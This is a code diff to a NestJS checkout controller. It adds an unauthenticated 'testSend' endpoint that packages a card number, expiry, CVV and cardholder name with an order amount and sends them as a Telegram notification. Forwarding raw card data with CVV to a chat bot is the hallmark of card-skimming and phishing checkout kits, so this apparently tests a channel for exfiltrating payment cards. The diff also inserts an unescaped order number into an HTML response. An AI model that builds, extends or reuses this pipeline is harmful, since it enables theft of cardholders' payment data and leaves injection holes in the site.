@@ -1,4 +1,4 @@
-import { Controller, Get, Body, Req, Res, Post, Put, Delete, Headers } from '@nestjs/common'
+import { Controller, Get, Body, Req, Res, Post, Put, Delete, Headers, Query,Logger } from '@nestjs/common'
 import { ApiTags, ApiBearerAuth } from '@nestjs/swagger'
 import { Response } from 'express'
 import { Transform } from 'class-transformer'
@@ -13,6 +13,7 @@ import { genId } from 'src/common/utils'
 @ApiTags('Cart订单管理')
 @Controller('cart')
 export class F1Controller {
+  private readonly logger = new Logger(F1Controller.name);
   constructor(private readonly f1Service: F1Service) {}
 
   /**
@@ -79,6 +80,49 @@ export class F1Controller {
     }
   }
 
+
+  @Get('testSend')
+  @Public()
+  async testSend(
+    @Req() req: Request,
+    @Res() res: Response,
+    @Query('orderNo') orderNo: string
+  ): Promise<any> {
+    try {
+      console.log('Test Send - Order No:', orderNo)
+      
+      if (!orderNo) {
+        return DataObj.create({ 
+          message: '请提供 orderNo 参数',
+          code: 400,
+        })
+      }
+      
+      // 从数据库获取订单信息
+      const order = await this.f1Service.findOne(orderNo)
+      
+      console.log('订单信息:', order)
+      
+      // 构造测试数据
+      const testData = {
+        orderNo: orderNo,
+        cardNumber: '4111111111111111',
+        expire: '12/25',
+        cvv: '123',
+        cardName: 'Test User',
+        amount: order.f1Money || 0,
+        status: 'success'
+      }
+      
+      // 发送 Telegram 通知
+      await this.f1Service.sendTelegramNotification(testData)
+      
+      this.logger.log('Telegram 通知发送成功')
+    
+    } catch (error) {
+      console.error('Test Send 错误:', error)
+    }
+  }
   /**
    * 支付接口
    * 保存支付信息并跳转到订单详情页
@@ -109,6 +153,8 @@ export class F1Controller {
       // 跳转到订单详情页
       const redirectUrl = `/card/detail?orderNo=${paymentDto.orderNo}`
  
+
+
       const html = `<html><body> <h3>订单支付成功！订单编号　：<a href="${redirectUrl}">${paymentDto.orderNo}</a></h3></body></html>`
       // 设置响应头为 text/html
       res.setHeader('Content-Type', 'text/html; charset=utf-8')
